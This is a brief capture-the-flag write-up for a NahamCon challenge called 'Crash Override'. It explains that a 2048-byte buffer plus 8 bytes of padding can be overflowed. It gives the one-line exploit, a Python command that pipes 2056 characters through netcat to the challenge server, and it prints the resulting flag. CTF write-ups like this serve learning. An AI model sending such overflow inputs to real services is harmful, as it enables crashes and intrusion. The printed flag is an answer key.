## Crash Override:

_Remember, hacking is more than just a crime. It's a survival trait._

------

Connect with:

`nc challenge.nahamcon.com 30443`

Attachment: [Crash Override](files/crash_override.c)

looking at c code we know the buffer size=2048 so after finding padding=8 we can give any input > 2056 and it will give flag
```
python -c "print('a'* 2056)" | nc challenge.nahamcon.com 32216
```

```
flag{de8b6655b538a0bf567b79a14f2669f6}  
```
